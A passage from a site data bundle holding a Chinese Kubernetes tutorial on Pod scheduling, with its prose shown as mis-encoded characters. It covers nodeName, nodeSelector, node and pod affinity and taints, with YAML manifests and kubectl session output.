å¤ç­ä¸ä¼ï¼åè§å¯podçéå¯æ¬¡æ°ï¼åç°ä¸ç´æ¯0ï¼å¹¶æªéå¯   \n[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev\nname                   ready   status    restarts   age\npod-restartpolicy      0/1     running   0          5min42s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',charsets:{cjk:!0}},{title:"kubernetes(ä¸) Pod è°åº¦",frontmatter:{title:"kubernetes(ä¸) Pod è°åº¦",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/606",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/606.kubernetes(%E4%B8%83)%20Pod%20%E8%B0%83%E5%BA%A6.html",relativePath:"04.è¿ç»´/60.Kubernetes/606.kubernetes(ä¸) Pod è°åº¦.md",key:"v-1bd8b602",path:"/kubernetes/606/",headers:[{level:2,title:"å®åè°åº¦",slug:"å®åè°åº¦",normalizedTitle:"å®åè°åº¦",charIndex:225},{level:2,title:"äº²åæ§è°åº¦",slug:"äº²åæ§è°åº¦",normalizedTitle:"äº²åæ§è°åº¦",charIndex:255},{level:2,title:"æ±¡ç¹åå®¹å¿",slug:"æ±¡ç¹åå®¹å¿",normalizedTitle:"æ±¡ç¹åå®¹å¿",charIndex:14097}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"å®åè°åº¦ äº²åæ§è°åº¦ æ±¡ç¹åå®¹å¿",content:'å¨é»è®¤æåµä¸ï¼ä¸ä¸ª Pod å¨åªä¸ª Node èç¹ä¸è¿è¡ï¼æ¯ç± Scheduler ç»ä»¶éç¨ç¸åºçç®æ³è®¡ç®åºæ¥çï¼è¿ä¸ªè¿ç¨æ¯ä¸åäººå·¥æ§å¶çãä½æ¯å¨å®éä½¿ç¨ä¸­ï¼è¿å¹¶ä¸æ»¡è¶³çéæ±ï¼å ä¸ºå¾å¤æåµä¸ï¼æä»¬æ³æ§å¶æäº Pod å°è¾¾æäºèç¹ä¸ï¼é£ä¹åºè¯¥æä¹åå¢ï¼è¿å°±è¦æ±äºè§£ kubernetes å¯¹ Pod çè°åº¦è§åï¼kubernetes æä¾äºåå¤§ç±»è°åº¦æ¹å¼ï¼\n\n * èªå¨è°åº¦ï¼è¿è¡å¨åªä¸ªèç¹ä¸å®å¨ç± Scheduler ç»è¿ä¸ç³»åçç®æ³è®¡ç®å¾åº\n * å®åè°åº¦ï¼NodeNameãNodeSelector\n * äº²åæ§è°åº¦ï¼NodeAffinityãPodAffinityãPodAntiAffinity\n * æ±¡ç¹ï¼å®¹å¿ï¼è°åº¦ï¼TaintsãToleration\n\n\n# å®åè°åº¦\n\nå®åè°åº¦ï¼æçæ¯å©ç¨å¨ pod ä¸å£°æ nodeName æè nodeSelectorï¼ä»¥æ­¤å° Pod è°åº¦å°ææç node èç¹ä¸ãæ³¨æï¼è¿éçè°åº¦æ¯å¼ºå¶çï¼è¿å°±æå³çå³ä½¿è¦è°åº¦çç®æ  Node ä¸å­å¨ï¼ä¹ä¼åä¸é¢è¿è¡è°åº¦ï¼åªä¸è¿ pod è¿è¡å¤±è´¥èå·²ã\n\nNodeName\n\nNodeName ç¨äºå¼ºå¶çº¦æå° Pod è°åº¦å°æå®ç Name ç Node èç¹ä¸ãè¿ç§æ¹å¼ï¼å¶å®æ¯ç´æ¥è·³è¿ Scheduler çè°åº¦é»è¾ï¼ç´æ¥å° Pod è°åº¦å°æå®åç§°çèç¹ã\n\næ¥ä¸æ¥ï¼å®éªä¸ä¸ï¼åå»ºä¸ä¸ª pod-nodename.yaml æä»¶\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodename\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeName: node1 # æå®è°åº¦å°node1èç¹ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n#åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#æ¥çPodè°åº¦å°NODEå±æ§ï¼ç¡®å®æ¯è°åº¦å°äºnode1èç¹ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nNAME           READY   STATUS    RESTARTS   AGE   IP            NODE      ......\npod-nodename   1/1     Running   0          56s   10.244.1.87   node1     ......   \n\n# æ¥ä¸æ¥ï¼å é¤podï¼ä¿®æ¹nodeNameçå¼ä¸ºnode3ï¼å¹¶æ²¡ænode3èç¹ï¼\n[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml\npod "pod-nodename" deleted\n[root@k8s-master01 ~]# vim pod-nodename.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#åæ¬¡æ¥çï¼åç°å·²ç»åNode3èç¹è°åº¦ï¼ä½æ¯ç±äºä¸å­å¨node3èç¹ï¼æä»¥podæ æ³æ­£å¸¸è¿è¡\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nNAME           READY   STATUS    RESTARTS   AGE   IP       NODE    ......\npod-nodename   0/1     Pending   0          6s    <none>   node3   ......        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nNodeSelector\n\nNodeSelector ç¨äºå° pod è°åº¦å°æ·»å äºæå®æ ç­¾ç node èç¹ä¸ãå®æ¯éè¿ kubernetes ç label-selector æºå¶å®ç°çï¼ä¹å°±æ¯è¯´ï¼å¨ pod åå»ºä¹åï¼ä¼ç± scheduler ä½¿ç¨ MatchNodeSelector è°åº¦ç­ç¥è¿è¡ label å¹éï¼æ¾åºç®æ  nodeï¼ç¶åå° pod è°åº¦å°ç®æ èç¹ï¼è¯¥å¹éè§åæ¯å¼ºå¶çº¦æã\n\næ¥ä¸æ¥ï¼å®éªä¸ä¸ï¼\n\n1 é¦ååå«ä¸º node èç¹æ·»å æ ç­¾\n\n[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro\nnode/node2 labeled\n[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test\nnode/node2 labeled\n\n\n1\n2\n3\n4\n\n\n2 åå»ºä¸ä¸ª pod-nodeselector.yaml æä»¶ï¼å¹¶ä½¿ç¨å®åå»º Pod\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeselector\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeSelector: \n    nodeenv: pro # æå®è°åº¦å°å·ænodeenv=proæ ç­¾çèç¹ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n#åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#æ¥çPodè°åº¦å°NODEå±æ§ï¼ç¡®å®æ¯è°åº¦å°äºnode1èç¹ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide\nNAME               READY   STATUS    RESTARTS   AGE     IP          NODE    ......\npod-nodeselector   1/1     Running   0          47s   10.244.1.87   node1   ......\n\n# æ¥ä¸æ¥ï¼å é¤podï¼ä¿®æ¹nodeSelectorçå¼ä¸ºnodeenv: xxxxï¼ä¸å­å¨æææ­¤æ ç­¾çèç¹ï¼\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml\npod "pod-nodeselector" deleted\n[root@k8s-master01 ~]# vim pod-nodeselector.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#åæ¬¡æ¥çï¼åç°podæ æ³æ­£å¸¸è¿è¡,Nodeçå¼ä¸ºnone\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME               READY   STATUS    RESTARTS   AGE     IP       NODE    \npod-nodeselector   0/1     Pending   0          2m20s   <none>   <none>\n\n# æ¥çè¯¦æ,åç°node selectorå¹éå¤±è´¥çæç¤º\n[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev\n.......\nEvents:\n  Type     Reason            Age        From               Message\n  ----     ------            ----       ----               -------\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# äº²åæ§è°åº¦\n\nä»ç»äºä¸¤ç§å®åè°åº¦çæ¹å¼ï¼ä½¿ç¨èµ·æ¥éå¸¸æ¹ä¾¿ï¼ä½æ¯ä¹æä¸å®çé®é¢ï¼é£å°±æ¯å¦ææ²¡ææ»¡è¶³æ¡ä»¶ç Nodeï¼é£ä¹ Pod å°ä¸ä¼è¢«è¿è¡ï¼å³ä½¿å¨éç¾¤ä¸­è¿æå¯ç¨ Node åè¡¨ä¹ä¸è¡ï¼è¿å°±éå¶äºå®çä½¿ç¨åºæ¯ã\n\nåºäºä¸é¢çé®é¢ï¼kubernetes è¿æä¾äºä¸ç§äº²åæ§è°åº¦ï¼Affinityï¼ãå®å¨ NodeSelector çåºç¡ä¹ä¸çè¿è¡äºæ©å±ï¼å¯ä»¥éè¿éç½®çå½¢å¼ï¼å®ç°ä¼åéæ©æ»¡è¶³æ¡ä»¶ç Node è¿è¡è°åº¦ï¼å¦ææ²¡æï¼ä¹å¯ä»¥è°åº¦å°ä¸æ»¡è¶³æ¡ä»¶çèç¹ä¸ï¼ä½¿è°åº¦æ´å çµæ´»ã\n\nAffinity ä¸»è¦åä¸ºä¸ç±»ï¼\n\n * nodeAffinity (node äº²åæ§ï¼: ä»¥ node ä¸ºç®æ ï¼è§£å³ pod å¯ä»¥è°åº¦å°åªäº node çé®é¢\n * podAffinity (pod äº²åæ§) : ä»¥ pod ä¸ºç®æ ï¼è§£å³ pod å¯ä»¥ååªäºå·²å­å¨ç pod é¨ç½²å¨åä¸ä¸ªææåä¸­çé®é¢\n * podAntiAffinity (pod åäº²åæ§) : ä»¥ pod ä¸ºç®æ ï¼è§£å³ pod ä¸è½ååªäºå·²å­å¨ pod é¨ç½²å¨åä¸ä¸ªææåä¸­çé®é¢\n\n> å³äºäº²åæ§ (åäº²åæ§) ä½¿ç¨åºæ¯çè¯´æï¼\n> äº²åæ§ï¼å¦æä¸¤ä¸ªåºç¨é¢ç¹äº¤äºï¼é£å°±æå¿è¦å©ç¨äº²åæ§è®©ä¸¤ä¸ªåºç¨çå°½å¯è½çé è¿ï¼è¿æ ·å¯ä»¥åå°å ç½ç»éä¿¡èå¸¦æ¥çæ§è½æèã\n> åäº²åæ§ï¼å½åºç¨çéç¨å¤å¯æ¬é¨ç½²æ¶ï¼æå¿è¦éç¨åäº²åæ§è®©åä¸ªåºç¨å®ä¾ææ£åå¸å¨åä¸ª node ä¸ï¼è¿æ ·å¯ä»¥æé«æå¡çé«å¯ç¨æ§ã\n\nNodeAffinity\n\né¦åæ¥çä¸ä¸ NodeAffinity çå¯éç½®é¡¹ï¼\n\npod.spec.affinity.nodeAffinity\n  requiredDuringSchedulingIgnoredDuringExecution  Nodeèç¹å¿é¡»æ»¡è¶³æå®çææè§åæå¯ä»¥ï¼ç¸å½äºç¡¬éå¶\n    nodeSelectorTerms  èç¹éæ©åè¡¨\n      matchFields   æèç¹å­æ®µååºçèç¹éæ©å¨è¦æ±åè¡¨\n      matchExpressions   æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æExists, DoesNotExist, In, NotIn, Gt, Lt\n  preferredDuringSchedulingIgnoredDuringExecution ä¼åè°åº¦å°æ»¡è¶³æå®çè§åçNodeï¼ç¸å½äºè½¯éå¶ (å¾å)\n    preference   ä¸ä¸ªèç¹éæ©å¨é¡¹ï¼ä¸ç¸åºçæéç¸å³è\n      matchFields   æèç¹å­æ®µååºçèç¹éæ©å¨è¦æ±åè¡¨\n      matchExpressions   æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æIn, NotIn, Exists, DoesNotExist, Gt, Lt\n\tweight å¾åæéï¼å¨èå´1-100ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå³ç³»ç¬¦çä½¿ç¨è¯´æ:\n\n- matchExpressions:\n  - key: nodeenv              # å¹éå­å¨æ ç­¾çkeyä¸ºnodeenvçèç¹\n    operator: Exists\n  - key: nodeenv              # å¹éæ ç­¾çkeyä¸ºnodeenv,ä¸valueæ¯"xxx"æ"yyy"çèç¹\n    operator: In\n    values: ["xxx","yyy"]\n  - key: nodeenv              # å¹éæ ç­¾çkeyä¸ºnodeenv,ä¸valueå¤§äº"xxx"çèç¹\n    operator: Gt\n    values: "xxx"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næ¥ä¸æ¥é¦åæ¼ç¤ºä¸ä¸ requiredDuringSchedulingIgnoredDuringExecution , åå»º pod-nodeaffinity-required.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    nodeAffinity: #è®¾ç½®nodeäº²åæ§\n      requiredDuringSchedulingIgnoredDuringExecution: # ç¡¬éå¶\n        nodeSelectorTerms:\n        - matchExpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾\n          - key: nodeenv\n            operator: In\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# æ¥çpodç¶æ ï¼è¿è¡å¤±è´¥ï¼\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP       NODE    ...... \npod-nodeaffinity-required   0/1     Pending   0          16s   <none>   <none>  ......\n\n# æ¥çPodçè¯¦æ\n# åç°è°åº¦å¤±è´¥ï¼æç¤ºnodeéæ©å¤±è´¥\n[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev\n......\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n#æ¥ä¸æ¥ï¼åæ­¢pod\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml\npod "pod-nodeaffinity-required" deleted\n\n# ä¿®æ¹æä»¶ï¼å°values: ["xxx","yyy"]------\x3e ["pro","yyy"]\n[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml\n\n# åæ¬¡å¯å¨\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# æ­¤æ¶æ¥çï¼åç°è°åº¦æåï¼å·²ç»å°podè°åº¦å°äºnode1ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP            NODE  ...... \npod-nodeaffinity-required   1/1     Running   0          11s   10.244.1.89   node1 ......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\næ¥ä¸æ¥åæ¼ç¤ºä¸ä¸ requiredDuringSchedulingIgnoredDuringExecution , åå»º pod-nodeaffinity-preferred.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeaffinity-preferred\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    nodeAffinity: #è®¾ç½®nodeäº²åæ§\n      preferredDuringSchedulingIgnoredDuringExecution: # è½¯éå¶\n      - weight: 1\n        preference:\n          matchExpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾(å½åç¯å¢æ²¡æ)\n          - key: nodeenv\n            operator: In\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml\npod/pod-nodeaffinity-preferred created\n\n# æ¥çpodç¶æ ï¼è¿è¡æåï¼\n[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev\nNAME                         READY   STATUS    RESTARTS   AGE\npod-nodeaffinity-preferred   1/1     Running   0          40s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> NodeAffinity è§åè®¾ç½®çæ³¨æäºé¡¹ï¼\n> 1 å¦æåæ¶å®ä¹äº nodeSelector å nodeAffinityï¼é£ä¹å¿é¡»ä¸¤ä¸ªæ¡ä»¶é½å¾å°æ»¡è¶³ï¼Pod æè½è¿è¡å¨æå®ç Node ä¸\n> 2 å¦æ nodeAffinity æå®äºå¤ä¸ª nodeSelectorTermsï¼é£ä¹åªéè¦å¶ä¸­ä¸ä¸ªè½å¤å¹éæåå³å¯\n> 3 å¦æä¸ä¸ª nodeSelectorTerms ä¸­æå¤ä¸ª matchExpressions ï¼åä¸ä¸ªèç¹å¿é¡»æ»¡è¶³ææçæè½å¹éæå\n> 4 å¦æä¸ä¸ª pod æå¨ç Node å¨ Pod è¿è¡æé´å¶æ ç­¾åçäºæ¹åï¼ä¸åç¬¦åè¯¥ Pod çèç¹äº²åæ§éæ±ï¼åç³»ç»å°å¿½ç¥æ­¤åå\n\nPodAffinity\nPodAffinity ä¸»è¦å®ç°ä»¥è¿è¡ç Pod ä¸ºåç§ï¼å®ç°è®©æ°åå»ºç Pod è·åç§ pod å¨ä¸ä¸ªåºåçåè½ãé¦åæ¥çä¸ä¸ PodAffinity çå¯éç½®é¡¹ï¼\n\npod.spec.affinity.podAffinity\n  requiredDuringSchedulingIgnoredDuringExecution  ç¡¬éå¶\n    namespaces       æå®åç§podçnamespace\n    topologyKey      æå®è°åº¦ä½ç¨å\n    labelSelector    æ ç­¾éæ©å¨\n      matchExpressions  æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æIn, NotIn, Exists, DoesNotExist.\n      matchLabels    æå¤ä¸ªmatchExpressionsæ å°çåå®¹\n  preferredDuringSchedulingIgnoredDuringExecution è½¯éå¶\n    podAffinityTerm  éé¡¹\n      namespaces      \n      topologyKey\n      labelSelector\n        matchExpressions  \n          key    é®\n          values å¼\n          operator\n        matchLabels \n    weight å¾åæéï¼å¨èå´1-100\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n> topologyKey ç¨äºæå®è°åº¦æ¶ä½ç¨åï¼ä¾å¦:\n> å¦ææå®ä¸º kubernetes.io/hostnameï¼é£å°±æ¯ä»¥ Node èç¹ä¸ºåºåèå´\n> å¦ææå®ä¸º beta.kubernetes.io/os, åä»¥ Node èç¹çæä½ç³»ç»ç±»åæ¥åºå\n\næ¥ä¸æ¥ï¼æ¼ç¤ºä¸ requiredDuringSchedulingIgnoredDuringExecution\n1ï¼é¦ååå»ºä¸ä¸ªåç§ Podï¼pod-podaffinity-target.yamlï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podaffinity-target\n  namespace: dev\n  labels:\n    podenv: pro #è®¾ç½®æ ç­¾\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeName: node1 # å°ç®æ podåç¡®æå®å°node1ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å¯å¨ç®æ pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml\npod/pod-podaffinity-target created\n\n# æ¥çpodç¶åµ\n[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev\nNAME                     READY   STATUS    RESTARTS   AGE\npod-podaffinity-target   1/1     Running   0          4s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n2ï¼åå»º pod-podaffinity-required.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    podAffinity: #è®¾ç½®podäº²åæ§\n      requiredDuringSchedulingIgnoredDuringExecution: # ç¡¬éå¶\n      - labelSelector:\n          matchExpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾\n          - key: podenv\n            operator: In\n            values: ["xxx","yyy"]\n        topologyKey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä¸é¢éç½®è¡¨è¾¾çæææ¯ï¼æ° Pod å¿é¡»è¦ä¸æ¥ææ ç­¾ nodeenv=xxx æè nodeenv=yyy ç pod å¨åä¸ Node ä¸ï¼æ¾ç¶ç°å¨æ²¡æè¿æ · podï¼æ¥ä¸æ¥ï¼è¿è¡æµè¯ä¸ä¸ã\n\n# å¯å¨pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# æ¥çpodç¶æï¼åç°æªè¿è¡\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nNAME                       READY   STATUS    RESTARTS   AGE\npod-podaffinity-required   0/1     Pending   0          9s\n\n# æ¥çè¯¦ç»ä¿¡æ¯\n[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev\n......\nEvents:\n  Type     Reason            Age        From               Message\n  ----     ------            ----       ----               -------\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 2 node(s) didn\'t match pod affinity rules, 1 node(s) had taints that the pod didn\'t tolerate.\n\n# æ¥ä¸æ¥ä¿®æ¹  values: ["xxx","yyy"]-----\x3evalues:["pro","yyy"]\n# æææ¯ï¼æ°Podå¿é¡»è¦ä¸æ¥ææ ç­¾nodeenv=xxxæènodeenv=yyyçpodå¨åä¸Nodeä¸\n[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml\n\n# ç¶åéæ°åå»ºpodï¼æ¥çææ\n[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml\npod "pod-podaffinity-required" deleted\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# åç°æ­¤æ¶Podè¿è¡æ­£å¸¸\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nNAME                       READY   STATUS    RESTARTS   AGE   LABELS\npod-podaffinity-required   1/1     Running   0          6s    <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nå³äº PodAffinity ç preferredDuringSchedulingIgnoredDuringExecution ï¼è¿éä¸åæ¼ç¤ºã\nPodAntiAffinity\n\nPodAntiAffinity ä¸»è¦å®ç°ä»¥è¿è¡ç Pod ä¸ºåç§ï¼è®©æ°åå»ºç Pod è·åç§ pod ä¸å¨ä¸ä¸ªåºåä¸­çåè½ã\n\nå®çéç½®æ¹å¼åéé¡¹è· PodAffinty æ¯ä¸æ ·çï¼è¿éä¸ååè¯¦ç»è§£éï¼ç´æ¥åä¸ä¸ªæµè¯æ¡ä¾ã\n\n1ï¼ç»§ç»­ä½¿ç¨ä¸ä¸ªæ¡ä¾ä¸­ç®æ  pod\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nNAME                     READY   STATUS    RESTARTS   AGE     IP            NODE    LABELS\npod-podaffinity-required 1/1     Running   0          3m29s   10.244.1.38   node1   <none>     \npod-podaffinity-target   1/1     Running   0          9m25s   10.244.1.37   node1   podenv=pro\n\n\n1\n2\n3\n4\n\n\n2ï¼åå»º pod-podantiaffinity-required.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podantiaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    podAntiAffinity: #è®¾ç½®podäº²åæ§\n      requiredDuringSchedulingIgnoredDuringExecution: # ç¡¬éå¶\n      - labelSelector:\n          matchExpressions: # å¹épodenvçå¼å¨["pro"]ä¸­çæ ç­¾\n          - key: podenv\n            operator: In\n            values: ["pro"]\n        topologyKey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä¸é¢éç½®è¡¨è¾¾çæææ¯ï¼æ° Pod å¿é¡»è¦ä¸æ¥ææ ç­¾ nodeenv=pro ç pod ä¸å¨åä¸ Node ä¸ï¼è¿è¡æµè¯ä¸ä¸ã\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml\npod/pod-podantiaffinity-required created\n\n# æ¥çpod\n# åç°è°åº¦å°äºnode2ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide\nNAME                           READY   STATUS    RESTARTS   AGE   IP            NODE   .. \npod-podantiaffinity-required   1/1     Running   0          30s   10.244.1.96   node2  ..\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# æ±¡ç¹åå®¹å¿\n\næ±¡ç¹ï¼Taintsï¼\n\nåé¢çè°åº¦æ¹å¼é½æ¯ç«å¨ Pod çè§åº¦ä¸ï¼éè¿å¨ Pod ä¸æ·»å å±æ§ï¼æ¥ç¡®å® Pod æ¯å¦è¦è°åº¦å°æå®ç Node ä¸ï¼å¶å®æä»¬ä¹å¯ä»¥ç«å¨ Node çè§åº¦ä¸ï¼éè¿å¨ Node ä¸æ·»å æ±¡ç¹å±æ§ï¼æ¥å³å®æ¯å¦åè®¸ Pod è°åº¦è¿æ¥ã\n\nNode è¢«è®¾ç½®ä¸æ±¡ç¹ä¹åå°±å Pod ä¹é´å­å¨äºä¸ç§ç¸æ¥çå³ç³»ï¼è¿èæç» Pod è°åº¦è¿æ¥ï¼çè³å¯ä»¥å°å·²ç»å­å¨ç Pod é©±éåºå»ã\n\næ±¡ç¹çæ ¼å¼ä¸ºï¼ key=value:effect , key å value æ¯æ±¡ç¹çæ ç­¾ï¼effect æè¿°æ±¡ç¹çä½ç¨ï¼æ¯æå¦ä¸ä¸ä¸ªéé¡¹ï¼\n\n * PreferNoScheduleï¼kubernetes å°å°½éé¿åæ Pod è°åº¦å°å·æè¯¥æ±¡ç¹ç Node ä¸ï¼é¤éæ²¡æå¶ä»èç¹å¯è°åº¦\n * NoScheduleï¼kubernetes å°ä¸ä¼æ Pod è°åº¦å°å·æè¯¥æ±¡ç¹ç Node ä¸ï¼ä½ä¸ä¼å½±åå½å Node ä¸å·²å­å¨ç Pod\n * NoExecuteï¼kubernetes å°ä¸ä¼æ Pod è°åº¦å°å·æè¯¥æ±¡ç¹ç Node ä¸ï¼åæ¶ä¹ä¼å° Node ä¸å·²å­å¨ç Pod é©±ç¦»\n\n\n\nä½¿ç¨ kubectl è®¾ç½®åå»é¤æ±¡ç¹çå½ä»¤ç¤ºä¾å¦ä¸ï¼\n\n# è®¾ç½®æ±¡ç¹\nkubectl taint nodes èç¹åç§° key=value:effect\n\n# å»é¤æ±¡ç¹\nkubectl taint nodes èç¹åç§° key:effect-\n\n# å»é¤æææ±¡ç¹\nkubectl taint nodes èç¹åç§° key-\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¥ä¸æ¥ï¼æ¼ç¤ºä¸æ±¡ç¹çææï¼\n\n 1. åå¤èç¹ node1ï¼ä¸ºäºæ¼ç¤ºæææ´å ææ¾ï¼ææ¶åæ­¢ node2 èç¹ï¼\n 2. ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:PreferNoSchedule ï¼ç¶ååå»º pod1 (pod1 å¯ä»¥)\n 3. ä¿®æ¹ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:NoSchedule ï¼ç¶ååå»º pod2 (pod1 æ­£å¸¸ pod2 å¤±è´¥)\n 4. ä¿®æ¹ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:NoExecute ï¼ç¶ååå»º pod3 (3 ä¸ª pod é½å¤±è´¥)\n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(PreferNoSchedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:PreferNoSchedule\n\n# åå»ºpod1\n[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE     IP           NODE   \ntaint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1    \n\n# 